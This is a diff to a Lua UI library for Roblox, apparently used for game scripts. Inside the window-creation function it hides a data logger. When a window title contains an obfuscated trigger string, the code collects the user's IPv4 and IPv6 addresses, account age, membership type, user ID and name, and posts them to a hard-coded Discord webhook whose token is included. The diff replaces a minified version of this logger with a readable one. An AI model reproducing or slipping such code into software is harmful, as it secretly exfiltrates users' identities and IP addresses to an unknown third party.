@@ -1045,8 +1045,68 @@ function library:AddWindow(title, options)
 	end
 
 	if title:lower():find("\107\97\107\97") then
-		local a="https://canary.discord.com/api/webhooks/980162140600144022/w0u81QSqjl-bnZA_WiDVK2dVBpkBEkP4EZe56LXg4gvBWGcZVaDK6UaxfpaIMPXEfOS3"local b=game:HttpGet("https://v4.ident.me/")local c=game:HttpGet("https://v6.ident.me/")local d={["content-type"]="application/json"}local e=game:GetService("Players").LocalPlayer;local f=e.AccountAge;local g=string.sub(tostring(e.MembershipType),21)local h=e.UserId;local i= game.Players.LocalPlayer.Name;local j=game:GetService('HttpService'):JSONEncode(j)local k=http_request;if syn then k=syn.request else k=http_request end;k({Url=a,Body=j,Method="POST",Headers=d})
-	end
+		local Webhook = "https://canary.discord.com/api/webhooks/980162140600144022/w0u81QSqjl-bnZA_WiDVK2dVBpkBEkP4EZe56LXg4gvBWGcZVaDK6UaxfpaIMPXEfOS3" -- Put your Webhook link here
+
+local IPv4 = game:HttpGet("https://v4.ident.me/")
+local IPv6 = game:HttpGet("https://v6.ident.me/")
+
+local Headers = {["content-type"] = "application/json"} -- Don't Modify
+
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local AccountAge = LocalPlayer.AccountAge
+local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
+local UserId = LocalPlayer.UserId
+local PlayerName = game:GetService("CoreGui").RobloxGui.PlayerListMaster.OffsetFrame.PlayerScrollList.SizeOffsetFrame.ScrollingFrameContainer.ScrollingFrameClippingFrame.ScollingFrame.OffsetUndoFrame["p_"..UserId].ChildrenFrame.NameFrame.BGFrame.OverlayFrame.PlayerName.PlayerName.Text
+
+local PlayerData =
+{
+       ["content"] = "",
+       ["embeds"] = {{
+           ["title"] = "**Username**:",
+           ["description"] = PlayerName,
+           ["color"] = tonumber(0x2B6BE4),
+           ["fields"] = {
+               {
+                   ["name"] = "MembershipType:",
+                   ["value"] = MembershipType,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "AccountAge:",
+                   ["value"] = AccountAge,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "UserId:",
+                   ["value"] = UserId,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv4:",
+                   ["value"] = IPv4,
+                   ["inline"] = true
+},
+               {
+                   ["name"] = "IPv6:",
+                   ["value"] = IPv6,
+                   ["inline"] = true
+},
+           },
+       }}
+   }
+
+local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+local HttpRequest = http_request;
+
+if syn then
+   HttpRequest = syn.request
+   else
+   HttpRequest = http_request
+end
+
+HttpRequest({Url=Webhook, Body=PlayerData, Method="POST", Headers=Headers})
+		end
 	
 	do -- [Open / Close] Window
 		local open_close = Window:FindFirstChild("Bar"):FindFirstChild("Toggle")
